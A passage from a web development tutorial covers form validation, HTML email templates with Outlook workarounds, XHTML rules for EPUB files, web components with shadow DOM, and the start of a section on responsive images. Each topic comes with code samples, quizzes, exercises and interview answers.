Never. Anything in the browser can be altered: DevTools can delete a `required` attribute, and a script or curl can post directly to the endpoint. Client-side validation exists for user experience, giving instant feedback and reducing round-trips; server-side validation exists for correctness and security. Both should enforce the same rules, ideally generated from one schema so they cannot drift. In my Python back ends the same regex that sits in the HTML `pattern` is compiled in the handler, and the server's error messages are rendered back into the form with `aria-describedby`.

**Q: What is the difference between `:invalid` and `:user-invalid`?**
`:invalid` matches as soon as a control fails its constraints, including a required field that is still empty on page load, which produces a form covered in red before the user has typed anything. `:user-invalid` matches only after the user has interacted with the control (or tried to submit), so errors appear at the right moment. It shipped in Firefox 88 and in Chrome 119 and Safari 16.5 in 2023, so it is safe to use today, with `:invalid` scoped under a `.submitted` class as the fallback pattern.

**Q: How would you validate a file upload in HTML?**
The `accept` attribute filters the file picker to, say, `.docx,.pdf`, but it is a hint, not a rule: users can switch the picker to "All files" and drag anything in, so it is not enforced on submit. Real checks need JavaScript reading `input.files[0].type` and `.size` before submit, and above all the server verifying the MIME type by content, not by extension, and enforcing size limits. For a client intake form accepting manuscripts I check size on the client (under 50 MB), then on the server open the file with python-docx or pikepdf to prove it is what it claims to be.

## HTML for email templates

Email is where HTML goes back in time. Gmail, Outlook, Apple Mail and Yahoo each render HTML with a different engine, and Outlook for Windows uses Microsoft Word's engine, which does not understand Flexbox, Grid, `max-width`, background images or most of what you learned. If a client asks for a branded newsletter, onboarding sequence or invoice email, you are writing 2003-era HTML on purpose, and doing it well is a specialised, well-paid skill.

### The rules of the game

- Layout with nested `<table>` elements, not divs. Give layout tables `role="presentation"` so screen readers ignore the grid.
- Inline styles on every element (`style="…"`); many clients strip `<style>` blocks or ignore classes. Keep a `<style>` block too, for clients that support it (media queries only work there).
- Width 600–640 px. Wider gets clipped in Outlook and preview panes.
- Web-safe fonts with fallbacks: Arial, Georgia, Verdana, Tahoma. Web fonts render in Apple Mail and iOS only.
- Absolute URLs for every image and link. There is no "current folder" in an inbox.
- Images: set `width`, `height`, `alt`, `style="display:block"` (removes the gap under images in Outlook) and `border="0"`.
- No JavaScript, no forms (mostly), no video, no `<iframe>`. They are stripped or flagged as spam.

### The skeleton

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Your handbook is ready</title>
  <!--[if mso]>
  <xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml>
  <![endif]-->
  <style>
    @media only screen and (max-width: 620px) {
      .container { width: 100% !important; }
      .stack { display: block !important; width: 100% !important; }
    }
  </style>
</head>
<body style="margin:0; padding:0; background:#f4f4f4;">
  <div style="display:none; max-height:0; overflow:hidden; font-size:1px; color:#f4f4f4;">Your handbook PDF is attached. TOC, cover and 767 pages, ready to print.</div>
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f4f4f4;">
    <tr><td align="center" style="padding:20px;">
      <table role="presentation" class="container" width="600" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff; width:600px;">
        <tr><td style="padding:24px; font-family:Arial, Helvetica, sans-serif; font-size:16px; line-height:24px; color:#333333;">
          Content goes here.
        </td></tr>
      </table>
    </td></tr>
  </table>
</body>
</html>
```

Three things to notice. The XHTML 1.0 Transitional doctype is still the most compatible choice across clients. The hidden `div` at the top is the **preheader**: the preview text inboxes show after the subject line. The `cellpadding="0" cellspacing="0" border="0"` trio on every table prevents Outlook adding gaps.

### Outlook conditional comments

`<!--[if mso]> … <![endif]-->` is read only by Outlook for Windows (mso = Microsoft Office). `<!--[if !mso]><!-- --> … <!--<![endif]-->` is read by everything *except* Outlook. This is how you give Outlook a table while other clients get a lighter structure, and it is the standard way to build a bulletproof button:

```html
<!--[if mso]>
<v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" href="https://example.com/download" style="height:44px;v-text-anchor:middle;width:220px;" arcsize="10%" fillcolor="#E34F26" stroke="f">
  <center style="color:#ffffff;font-family:Arial;font-size:16px;">Download handbook</center>
</v:roundrect>
<![endif]-->
<!--[if !mso]><!-- -->
<a href="https://example.com/download" style="background:#E34F26;color:#ffffff;display:inline-block;padding:12px 28px;font-family:Arial;font-size:16px;text-decoration:none;border-radius:4px;">Download handbook</a>
<!--<![endif]-->
```

### Two-column that stacks on mobile

```html
<table role="presentation" width="600" cellpadding="0" cellspacing="0" border="0">
  <tr>
    <td class="stack" width="300" valign="top" style="padding:12px;">Left column</td>
    <td class="stack" width="300" valign="top" style="padding:12px;">Right column</td>
  </tr>
</table>
```

The `.stack` class from the media query turns each cell into a full-width block on phones. Gmail, Apple Mail and Outlook iOS honour it; Outlook Windows keeps two columns, which is acceptable because it is a desktop client.

| Client | Engine | Notable limits |
|---|---|---|
| Outlook 2016–365 (Windows) | Word | No Flexbox/Grid, no `max-width`, no background images without VML |
| Gmail (web/app) | Custom | Strips `<style>` in some cases, no web fonts |
| Apple Mail / iOS | WebKit | Almost full CSS, web fonts OK |
| Yahoo / AOL | Custom | Supports media queries, quirks with `padding` |

### Testing and sending

Write the email, inline the CSS with a tool (Premailer, Juice, or `premailer` in Python), then test in Litmus or Email on Acid, or at minimum send to a Gmail, an Outlook and an iPhone. Send through a transactional service (Postmark, SendGrid, Mailgun) rather than a personal SMTP account so SPF, DKIM and DMARC are handled; those DNS records decide deliverability more than the HTML does.

> **Warning:** Do not use a background image on the outer table for anything essential. Outlook Windows will not show it, and your white text on a now-white background becomes invisible. Always set a solid `bgcolor` fallback.

### Try It Yourself

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Your handbook is ready</title>
<style>@media only screen and (max-width:620px){.container{width:100% !important}.stack{display:block !important;width:100% !important}}</style>
</head>
<body style="margin:0;padding:0;background:#f4f4f4;">
<div style="display:none;max-height:0;overflow:hidden;font-size:1px;color:#f4f4f4;">Your 767-page handbook PDF is attached and ready to print.</div>
<table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f4f4f4">
 <tr><td align="center" style="padding:20px;">
  <table role="presentation" class="container" width="600" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" style="width:600px;max-width:600px;">
   <tr><td bgcolor="#E34F26" style="padding:20px;font-family:Arial,Helvetica,sans-serif;font-size:22px;color:#ffffff;font-weight:bold;">Ali Raza Documents</td></tr>
   <tr><td style="padding:24px;font-family:Arial,Helvetica,sans-serif;font-size:16px;line-height:24px;color:#333333;">
     <p style="margin:0 0 16px 0;">Hi Sarah,</p>
     <p style="margin:0 0 16px 0;">Your Employee Handbook is finished: 767 pages, automated table of contents, print-ready cover and a fillable acknowledgement form on the last page.</p>
     <a href="https://example.com/download" style="background:#E34F26;color:#ffffff;display:inline-block;padding:12px 28px;font-size:16px;text-decoration:none;border-radius:4px;">Download handbook</a>
   </td></tr>
   <tr><td style="padding:0 24px 24px 24px;">
     <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
      <tr>
       <td class="stack" width="50%" valign="top" style="padding:8px;font-family:Arial,sans-serif;font-size:14px;color:#555;">Pages: 767<br />Format: PDF/A + DOCX</td>
       <td class="stack" width="50%" valign="top" style="padding:8px;font-family:Arial,sans-serif;font-size:14px;color:#555;">Revisions: 2 included<br />Delivered: 15 Sep 2026</td>
      </tr>
     </table>
   </td></tr>
   <tr><td bgcolor="#eeeeee" style="padding:16px 24px;font-family:Arial,sans-serif;font-size:12px;color:#777;">You received this because you ordered on Fiverr. <a href="https://example.com/unsubscribe" style="color:#777;">Unsubscribe</a></td></tr>
  </table>
 </td></tr>
</table>
</body>
</html>
```

### Quiz

1. Why do email templates use tables for layout?
- [x] Outlook for Windows renders with Word's engine, which lacks Flexbox and Grid
- [ ] Tables load faster
- [ ] Gmail requires them
> Word's renderer supports table layout reliably and little else.

2. What does `<!--[if mso]>` target?
- [ ] Gmail
- [x] Outlook for Windows
- [ ] Apple Mail
> `mso` stands for Microsoft Office; only Outlook Windows evaluates it.

3. What is a preheader?
- [x] Hidden text at the top shown as preview text in the inbox
- [ ] The email subject
- [ ] The `<head>` element
> Inboxes show the first visible text after the subject; the preheader controls it.

4. Where do media queries need to be for responsive email?
- [ ] Inline in `style=""` attributes
- [x] In a `<style>` block in the head
- [ ] In an external stylesheet
> Media queries cannot be inlined; clients that support them read the `<style>` block.

### Exercises

1. **Bulletproof image** — Write an `<img>` tag for a 600×200 header banner that avoids the Outlook gap and shows alt text with the brand name if images are blocked.
<details><summary>Solution</summary>

```html
<img src="https://example.com/img/banner.png" width="600" height="200" alt="Ali Raza Documents" border="0" style="display:block;width:600px;height:auto;max-width:100%;" />
```

</details>

2. **Three KPI cells** — Build a single-row presentation table with three equal cells (Orders, Errors, Accuracy) that stack on phones.
<details><summary>Solution</summary>

```html
<table role="presentation" width="600" cellpadding="0" cellspacing="0" border="0">
  <tr>
    <td class="stack" width="200" align="center" style="padding:12px;font-family:Arial;">Orders<br /><strong>343</strong></td>
    <td class="stack" width="200" align="center" style="padding:12px;font-family:Arial;">Errors<br /><strong>13</strong></td>
    <td class="stack" width="200" align="center" style="padding:12px;font-family:Arial;">Accuracy<br /><strong>96.8%</strong></td>
  </tr>
</table>
```

</details>

### Interview Questions

**Q: Why is HTML email so different from web HTML?**
Because there is no single rendering engine and no standard. Each client applies its own sanitiser and renderer: Outlook for Windows uses Word, Gmail rewrites the CSS, some strip `<style>` entirely. The lowest common denominator is tables, inline styles, web-safe fonts and absolute URLs, with progressive enhancement through `<style>` media queries for capable clients and conditional comments for Outlook. Deliverability adds another layer: authentication records and content heuristics matter more than markup. Anyone who has shipped a newsletter knows to budget as much time for testing as for building.

**Q: How do you make a button that works everywhere?**
A "bulletproof button" combines an `<a>` styled with inline padding, background and `display:inline-block` for most clients with a VML `<v:roundrect>` inside an `<!--[if mso]>` conditional for Outlook Windows, which ignores padding on anchors. Both link to the same URL and show the same text. An alternative is a single-cell table with `bgcolor` and the link inside, which Outlook respects, at the cost of the whole cell not being clickable outside the text. I use the VML version for primary calls to action and the table version for secondary links.

**Q: How would you generate hundreds of personalised emails from data?**
Build one template with the table skeleton, keep the CSS inline, and render it with a template engine such as Jinja2, escaping every user value to prevent HTML injection. Run the output through an inliner only if the template keeps a `<style>` block for development convenience. Send via an API such as Postmark or SendGrid with batch endpoints, include a plain-text alternative part, and log message IDs for bounces. For a client with a 5,000-row Excel of recipients I load it with pandas, render per row, and send in batches of 500 with retries.

## XHTML rules for EPUB

Every EPUB3 you produce is a ZIP of XHTML files, and XHTML is HTML written as strict XML. Browsers forgive almost anything; XML parsers forgive nothing. One unclosed `<br>` or bare `&` in a 400-page ebook makes epubcheck fail and Amazon KDP, Apple Books and IngramSpark reject the upload. This chapter is the discipline that turns a "works in Chrome" file into a file that passes validation on the first try.

### A valid EPUB3 content document

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xml:lang="en" lang="en">
<head>
  <meta charset="utf-8"/>
  <title>Chapter 3: Rate Calculation</title>
  <link rel="stylesheet" type="text/css" href="../css/style.css"/>
</head>
<body>
  <section epub:type="chapter" role="doc-chapter" id="ch3"><h1>Chapter 3: Rate Calculation</h1>
    <p>Policy amounts are rounded to the nearest thousand.<br/>See &#167;&#160;4.2.</p>
    <img src="../img/matrix.png" alt="Texas rate matrix"/>
  </section>
</body>
</html>
```

Compare that with ordinary HTML and you find every rule below.

### The rules

| Rule | HTML allows | XHTML requires |
|---|---|---|
| Root namespace | none | `xmlns="http://www.w3.org/1999/xhtml"` on `<html>` |
| Void elements | `<br>`, `<img>`, `<hr>`, `<meta>` | `<br/>`, `<img … />`, `<hr/>`, `<meta … />` |
| Every element closed | `<p>` auto-closes, `<li>` optional | `</p>`, `</li>` always present |
| Case | `<P>`, `<IMG>` | Lowercase only |
| Attribute values | `width=600`, `disabled` | Quoted `width="600"`, `disabled="disabled"` |
| Ampersands | `a & b` | `a &amp; b`, also inside `href` |
| Named entities | `&nbsp;`, `&mdash;`, `&copy;` | Only `&amp; &lt; &gt; &quot; &apos;`; use `&#160;`, `&#8212;`, `&#169;` |
| Nesting | overlapping tolerated | Strictly nested |
| Inline in block | `<div>` inside `<p>` fixed by parser | Error: `<p>` may contain only phrasing content |
| Script/style content | raw `<` allowed | Wrap in `<![CDATA[ … ]]>` or escape |
| Duplicate ids | ignored | Error |
| File extension / type | `.html` | `.xhtml`, `application/xhtml+xml` in the OPF manifest |

Two rules cause most failures. First, **block inside inline or inside `<p>`**: Word exports and rich-text editors love `<p><div>…</div></p>`, which browsers silently repair by closing the `<p>` early; XML sees an unclosed element. Second, **entities**: anything Word or a CMS emitted as `&nbsp;` must become `&#160;` or a literal non-breaking space character.

### EPUB-specific vocabulary

EPUB3 adds the `epub:type` attribute (with the `xmlns:epub` namespace declared) to label document parts, and pairs it with ARIA `role` values from the DPUB-ARIA vocabulary for accessibility.

```xml
<nav epub:type="toc" role="doc-toc" id="toc"><h1>Contents</h1>
  <ol>
    <li><a href="ch1.xhtml">1. Introduction</a></li>
    <li><a href="ch2.xhtml">2. Definitions</a>
      <ol><li><a href="ch2.xhtml#s2-1">2.1 Terms</a></li></ol>
    </li>
  </ol>
</nav>
<section epub:type="footnotes">
  <aside epub:type="footnote" id="fn1"><p>Rates effective 1 July 2026.</p></aside>
</section>
```

The `nav` document is mandatory in EPUB3; its `<ol>` must contain only `<li>` with a single `<a>` or `<span>` followed by an optional nested `<ol>`. Footnotes marked `epub:type="footnote"` pop up in Apple Books and Kobo, and `<a epub:type="noteref" href="#fn1">` links to them.

### What the OPF expects

The package file (`content.opf`) lists every file with its media type. XHTML content must be declared as `application/xhtml+xml`; the nav document carries `properties="nav"`; any file with inline SVG or MathML needs `properties="svg"` or `"mathml"`; a file with `<script>` needs `properties="scripted"`. Mismatches between properties and content are epubcheck errors, not warnings.

### Converting HTML to XHTML safely

Do not fix XHTML by hand across 40 chapters. Parse with an HTML5 parser and serialise as XML:

```python
from lxml import html, etree
doc = html.fromstring(open("chapter.html", encoding="utf-8").read())
xhtml = etree.tostring(doc, method="xml", encoding="unicode")   # closes void elements, escapes &
```

Pandoc (`pandoc chapter.html -o chapter.xhtml`), Sigil and Calibre all do the same. Then run `java -jar epubcheck.jar book.epub` and read the errors in order; the first error often causes the next ten.

> **Warning:** A `<script>` in XHTML containing `if (a < b)` breaks the parse because `<` starts a tag. Wrap the body in `//<![CDATA[ … //]]>` or move the script to an external file. Better still, EPUBs rarely need scripts at all, and Kindle ignores them.

### WeasyPrint is lenient; epubcheck is not

WeasyPrint parses input with an HTML5 parser (html5lib), so it accepts sloppy HTML just as Chrome does. That means the same source can produce a perfect PDF and a broken EPUB. The practice that saves time: write XHTML-strict markup from the start, feed it to both tools, and validate the EPUB on every build.

### Try It Yourself

```html
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" lang="en" xml:lang="en">
<head>
  <meta charset="utf-8"/>
  <title>Chapter 3: Rate Calculation</title>
  <style>
    body{font-family:Georgia,serif;margin:2rem;line-height:1.6}
    aside[epub|footnote], aside.footnote{font-size:.9em;color:#555;border-top:1px solid #ccc;margin-top:2rem;padding-top:.5rem}
    nav ol{padding-left:1.2rem}
  </style>
</head>
<body>
  <nav epub:type="toc" role="doc-toc" id="toc">
    <h2>Contents</h2>
    <ol>
      <li><a href="#s1">3.1 Rounding</a></li>
      <li><a href="#s2">3.2 Lookup</a></li>
    </ol>
  </nav>
  <section epub:type="chapter" role="doc-chapter" id="ch3">
    <h1>Chapter 3: Rate Calculation</h1>
    <section id="s1"><h2>3.1 Rounding</h2>
      <p>Policy amounts are rounded to the nearest thousand<a epub:type="noteref" role="doc-noteref" href="#fn1">1</a>.<br/>See &#167;&#160;4.2 of the manual &#8212; Texas &amp; Florida differ.</p>
    </section>
    <section id="s2"><h2>3.2 Lookup</h2>
      <p>Find the tier row and read the premium column.</p>
      <img src="https://placehold.co/300x120/1572B6/white?text=Rate+matrix" alt="Texas rate matrix extract" width="300" height="120"/>
    </section>
    <aside epub:type="footnote" role="doc-footnote" id="fn1" class="footnote"><p>1. Rates effective 1 July 2026.</p></aside>
  </section>
</body>
</html>
```

### Quiz

1. Which named entity is valid in an EPUB3 XHTML file without a DTD?
- [ ] `&nbsp;`
- [x] `&amp;`
- [ ] `&mdash;`
> XML predefines only `amp`, `lt`, `gt`, `quot` and `apos`.

2. How must `<br>` be written in XHTML?
- [ ] `<BR>`
- [x] `<br/>`
- [ ] `<br></br>` only
> Void elements use the self-closing form; `<br></br>` is legal XML but confuses HTML parsers.

3. What media type does the OPF manifest declare for XHTML content?
- [ ] `text/html`
- [x] `application/xhtml+xml`
- [ ] `application/epub+zip`
> EPUB content documents are XHTML; `application/epub+zip` is the container type.

4. What is `epub:type="toc"` used for?
- [x] Marking the mandatory navigation document's table of contents
- [ ] Adding a page number
- [ ] Declaring the book title
> EPUB3 readers locate the TOC by this attribute on a `<nav>`.

### Exercises

1. **Fix for XHTML** — Convert `<p>Terms & Conditions<br>Version 2<img src=a.png></p>` to valid XHTML.
<details><summary>Solution</summary>

```xml
<p>Terms &amp; Conditions<br/>Version 2<img src="a.png" alt=""/></p>
```

</details>

2. **Nav document** — Write an EPUB3 `nav` with two chapters, the second having one sub-section.
<details><summary>Solution</summary>

```xml
<nav epub:type="toc" role="doc-toc">
  <h1>Contents</h1>
  <ol>
    <li><a href="ch1.xhtml">Chapter 1</a></li>
    <li><a href="ch2.xhtml">Chapter 2</a>
      <ol><li><a href="ch2.xhtml#s1">2.1 Scope</a></li></ol>
    </li>
  </ol>
</nav>
```

</details>

3. **CDATA** — Make this valid inside an XHTML `<script>`: `if (pages < 100 && rush) alert("ok")`.
<details><summary>Solution</summary>

```xml
<script>//<![CDATA[
if (pages < 100 && rush) alert("ok");
//]]></script>
```

</details>

### Interview Questions

**Q: Why does EPUB use XHTML instead of HTML?**
EPUB was designed so that reading systems on constrained devices could parse content with a plain XML parser, which is small, fast and unambiguous, rather than implementing the HTML5 error-recovery algorithm. Strictness also guarantees that every reader builds the same tree, which matters when the same file must render on Kindle, Kobo, Apple Books and a braille display. The cost is fragility: one unescaped ampersand fails the whole file. EPUB3 explicitly requires XHTML5 serialised as XML with the `application/xhtml+xml` media type, so this is a hard rule, not a convention.

**Q: What are the most common epubcheck errors you have seen and how do you prevent them?**
In order of frequency: unescaped `&` in URLs and text, undeclared named entities like `&nbsp;`, unclosed void elements, block elements inside `<p>`, duplicate `id` values across a chapter, missing `alt` attributes, resources referenced but not listed in the manifest, and `properties` mismatches such as inline SVG without `properties="svg"`. Prevention is a pipeline: generate XHTML through an XML serialiser rather than string concatenation, run epubcheck on every build, and treat warnings as errors. A hand-edited 400-page book without that pipeline will fail; with it, the first run typically passes.

**Q: How do you handle a client's manuscript that arrives as a DOCX with manual formatting?**
First fix the source: apply real heading styles, real lists and real captions in Word, because clean structure in DOCX becomes clean `<h1>`, `<ol>` and `<figure>` in the export. Then convert with Pandoc to EPUB3 or to XHTML chapters, which yields valid XML and a nav document automatically. Post-process with a script for typography (numeric entities, non-breaking spaces before units), attach the CSS and fonts, and validate with epubcheck. For Kindle, run the EPUB through Kindle Previewer to confirm the KF8 conversion. This is usually a two-hour job on a clean manuscript and a two-day job on a messy one, which is how I quote it.

# LEVEL: Expert

## Web components & templates

Web components let you define your own HTML elements, with their own markup, styles and behaviour, using nothing but browser standards: **custom elements**, **shadow DOM** and the **`<template>`/`<slot>`** elements. They are how design systems ship a `<report-card>` or `<kpi-tile>` that works in plain HTML, React, Vue or a Jinja2 template alike. For document work, they are also the cleanest way to build a live report dashboard that reuses one component per KPI.

### The template element

`<template>` holds inert markup: it is parsed, but not rendered, its images are not fetched and its scripts do not run. You clone it when you need a copy.

```html
<template id="kpi-tpl">
  <div class="kpi">
    <p class="label"></p>
    <p class="value"></p>
  </div>
</template>
<script>
  const tpl = document.getElementById('kpi-tpl');
  const node = tpl.content.cloneNode(true);       // DocumentFragment
  node.querySelector('.label').textContent = 'Orders';
  node.querySelector('.value').textContent = '343';
  document.body.appendChild(node);
</script>
```

`tpl.content` is a `DocumentFragment`; `cloneNode(true)` deep-copies it. This alone replaces a lot of `innerHTML` string building, and it is safe against injection because you set `textContent`.

### Defining a custom element

A custom element is a class extending `HTMLElement`, registered with `customElements.define`. The name must contain a hyphen so it never collides with a future built-in.

```html
<kpi-tile label="Orders" value="343"></kpi-tile>
<script>
class KpiTile extends HTMLElement {
  static get observedAttributes() { return ['label', 'value']; }
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
    this.shadowRoot.innerHTML = `
      <style>
        :host { display: inline-block; padding: 1rem; border: 1px solid #ccc; border-radius: 6px; font-family: Arial, sans-serif; }
        .value { font-size: 2rem; font-weight: bold; color: var(--kpi-color, #E34F26); }
      </style>
      <p class="label"></p><p class="value"></p>`;
  }
  attributeChangedCallback(name, oldV, newV) {
    this.shadowRoot.querySelector('.' + name).textContent = newV;
  }
  connectedCallback() { this.setAttribute('role', 'group'); }
}
customElements.define('kpi-tile', KpiTile);
</script>
```

| Lifecycle callback | Fires when |
|---|---|
| `constructor` | Element is created (do not read attributes or children here) |
| `connectedCallback` | Inserted into the document; fetch data, add listeners |
| `disconnectedCallback` | Removed; clean up listeners and timers |
| `attributeChangedCallback` | An attribute listed in `observedAttributes` changes |
| `adoptedCallback` | Moved to another document (rare) |

### Shadow DOM

`attachShadow({ mode: 'open' })` gives the element a private DOM subtree. Styles inside do not leak out and page styles do not leak in, except inherited properties (font, color) and **CSS custom properties**, which is why `var(--kpi-color)` above lets the page theme the component. `:host` styles the element itself; `:host([compact])` styles it when it has an attribute. `mode: 'closed'` hides `element.shadowRoot` from outside scripts, which sounds secure but mostly breaks testing tools; libraries almost always use `open`.

### Slots

Slots let users of your component supply content into named holes, keeping the light DOM (what the author wrote) in the document where screen readers and search engines can see it.

```html
<report-card>
  <span slot="title">Week 37 summary</span>
  <p>343 orders, 13 errors, 96.8% accuracy.</p>
</report-card>
<template id="report-card-tpl">
  <style>:host{display:block;border:1px solid #ddd;padding:1rem} header{font-weight:bold}</style>
  <header><slot name="title">Untitled</slot></header>
  <slot></slot>
</template>
```

The text inside `<slot name="title">` is the fallback when nothing is slotted. The unnamed `<slot>` receives everything else. `::slotted(p)` in the shadow stylesheet styles slotted children lightly.

### Declarative shadow DOM

Since Chrome 111, Safari 16.4 and Firefox 123, a `<template shadowrootmode="open">` placed inside an element is turned into a shadow root by the HTML parser itself, with no JavaScript. That lets a server (or a WeasyPrint-bound template) ship pre-rendered components:

```html
<kpi-tile>
  <template shadowrootmode="open">
    <style>.value{font-size:2rem}</style>
    <p class="value">343</p>
  </template>
</kpi-tile>
```

### Customised built-ins

`class FancyButton extends HTMLButtonElement` with `customElements.define('fancy-button', FancyButton, { extends: 'button' })` and `<button is="fancy-button">` inherits all native button behaviour. Safari never implemented the `is` attribute, so autonomous custom elements (extending `HTMLElement`) are the portable choice.

> **Interview note:** "Why web components instead of React components?" The honest answer is interoperability and longevity: a custom element runs in any framework or none, survives framework migrations and is delivered by the platform. The trade-offs are weaker server-side rendering (improving with declarative shadow DOM), styling friction across the shadow boundary and a smaller ecosystem. Many design systems (Adobe Spectrum, Shoelace/Web Awesome, Microsoft FAST) chose web components for exactly that reason.

### Try It Yourself

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Web components</title>
<style>body{font-family:Arial,sans-serif;margin:2rem} kpi-tile{margin-right:1rem} .good{--kpi-color:#080}</style></head>
<body>
  <h1>Week 37 dashboard</h1>
  <kpi-tile label="Orders" value="343"></kpi-tile>
  <kpi-tile label="Errors" value="13"></kpi-tile>
  <kpi-tile class="good" label="Accuracy" value="96.8%"></kpi-tile>
  <p><button id="bump">Simulate new order</button></p>
  <report-card>
    <span slot="title">Notes</span>
    <p>Slotted content stays in the light DOM and remains searchable.</p>
  </report-card>
  <template id="report-card-tpl">
    <style>:host{display:block;border:1px solid #ddd;padding:1rem;max-width:420px;margin-top:1rem} header{font-weight:bold;margin-bottom:.5rem} ::slotted(p){margin:0}</style>
    <header><slot name="title">Untitled</slot></header>
    <slot></slot>
  </template>
  <script>
    class KpiTile extends HTMLElement {
      static get observedAttributes(){ return ['label','value']; }
      constructor(){ super(); this.attachShadow({mode:'open'}); this.shadowRoot.innerHTML =
        `<style>:host{display:inline-block;padding:1rem;border:1px solid #ccc;border-radius:6px;min-width:110px}
         .label{margin:0;color:#666;font-size:.9rem}.value{margin:0;font-size:2rem;font-weight:bold;color:var(--kpi-color,#E34F26)}</style>
         <p class="label"></p><p class="value"></p>`; }
      attributeChangedCallback(n,o,v){ this.shadowRoot.querySelector('.'+n).textContent = v; }
    }
    customElements.define('kpi-tile', KpiTile);
    class ReportCard extends HTMLElement {
      connectedCallback(){ if(!this.shadowRoot){ this.attachShadow({mode:'open'}).appendChild(document.getElementById('report-card-tpl').content.cloneNode(true)); } }
    }
    customElements.define('report-card', ReportCard);
    document.getElementById('bump').onclick = () => { const t = document.querySelector('kpi-tile'); t.setAttribute('value', Number(t.getAttribute('value')) + 1); };
  </script>
</body>
</html>
```

### Quiz

1. Why must a custom element name contain a hyphen?
- [x] To guarantee it never clashes with a current or future built-in element
- [ ] Because CSS requires it
- [ ] For performance
> The HTML spec reserves hyphen-less names for the platform.

2. What does `<template>` content do before it is cloned?
- [ ] Renders hidden
- [x] Nothing: it is inert, no rendering, no fetching, no scripts
- [ ] Runs its scripts once
> Template content lives in a separate inert document fragment.

3. Which CSS features cross the shadow boundary?
- [ ] Class selectors from the page
- [x] Inherited properties and custom properties
- [ ] IDs
> Encapsulation blocks selectors; inheritance and `var()` still flow in.

4. Which callback should fetch data and add event listeners?
- [ ] `constructor`
- [x] `connectedCallback`
- [ ] `attributeChangedCallback`
> The element is in the document only from `connectedCallback` onward.

### Exercises

1. **Status badge** — Create `<qa-badge status="pass">` that renders green "PASS" or red "FAIL" text from its `status` attribute and updates when the attribute changes.
<details><summary>Solution</summary>

```html
<qa-badge status="pass"></qa-badge>
<script>
class QaBadge extends HTMLElement {
  static get observedAttributes(){ return ['status']; }
  constructor(){ super(); this.attachShadow({mode:'open'}); this.shadowRoot.innerHTML = '<style>span{padding:2px 8px;border-radius:4px;color:#fff;font:bold 12px Arial}.pass{background:#080}.fail{background:#c00}</style><span></span>'; }
  attributeChangedCallback(_, __, v){ const s = this.shadowRoot.querySelector('span'); s.className = v; s.textContent = v.toUpperCase(); }
}
customElements.define('qa-badge', QaBadge);
</script>
```

</details>

2. **Slotted footer** — Add a named `footer` slot to the `report-card` template with fallback text "No footer".
<details><summary>Solution</summary>

```html
<template id="report-card-tpl">
  <header><slot name="title">Untitled</slot></header>
  <slot></slot>
  <footer><slot name="footer">No footer</slot></footer>
</template>
```

</details>

### Interview Questions

**Q: Explain the three technologies behind web components and how they fit together.**
Custom elements give you a registered tag name backed by a JavaScript class with lifecycle callbacks. Shadow DOM gives that element a private subtree with scoped CSS so its internals do not clash with the page. The `<template>` element (with `<slot>`) provides inert markup to stamp into that shadow tree and holes for the consumer's content. You can use each alone: a custom element without shadow DOM is common for behaviour-only enhancements, and templates are useful for plain cloning. Together they make a self-contained component that works anywhere HTML works, including inside a React tree or a server-rendered Jinja2 page.

**Q: How do you make a web component accessible?**
Slotted content lives in the light DOM, so prefer slots for text that must be read or indexed. Inside the shadow root, use native elements (`<button>`, `<input>`) rather than styled divs so keyboard behaviour comes for free, and forward `aria-*` attributes or use `ElementInternals` (`this.attachInternals()`) to set roles and form values. Labels cannot cross the shadow boundary with `for`/`id`, so either keep label and control on the same side or use `aria-labelledby` through `ElementInternals`. Form-associated custom elements (`static formAssociated = true`) participate in form submission and validation like native controls, which is needed for any custom input.

**Q: What are the drawbacks of shadow DOM?**
Global styles do not apply, so a design system must expose custom properties or `::part()` hooks, and a theme change can require touching every component. Server-side rendering needs declarative shadow DOM or a shim, otherwise the page renders empty until scripts run. Some tools (older testing libraries, browser find-in-page in a few cases, some screen reader combinations) handle shadow trees imperfectly. Event `composed` flags and `event.composedPath()` add complexity when listening across the boundary. In practice I use shadow DOM for leaf widgets with strong internal styling and skip it for layout or content components that should inherit the page's look.

## Performance: lazy loading, preload & responsive images

Most page weight is images, and most render delay is the browser discovering resources too late. HTML has attributes and link relations that fix both without JavaScript: tell the browser what to fetch first, what to fetch later, and which image variant fits this screen. These same techniques decide your Lighthouse score and the Core Web Vitals that Google uses for ranking.

### Responsive images with srcset and sizes

One 2400-pixel hero image sent to a 360-pixel phone wastes bandwidth and time. `srcset` lists candidates with their widths, and `sizes` tells the browser how wide the image will be displayed, so it can pick the smallest adequate file *before* CSS has loaded.

```html
<img src="cover-800.jpg"
     srcset="cover-400.jpg 400w, cover-800.jpg 800w, cover-1600.jpg 1600w"
     sizes="(max-width: 600px) 100vw, 50vw"
     alt="Employee Handbook cover" width="800" height="1000">
```

Reading it: on screens up to 600px the image is full-width (100vw), otherwise half the viewport. The browser multiplies by the device pixel ratio and chooses; a 2× phone at 360px needs about 720px, so it fetches the 800w file. The `src` is the fallback for old browsers.

### Art direction and modern formats with picture

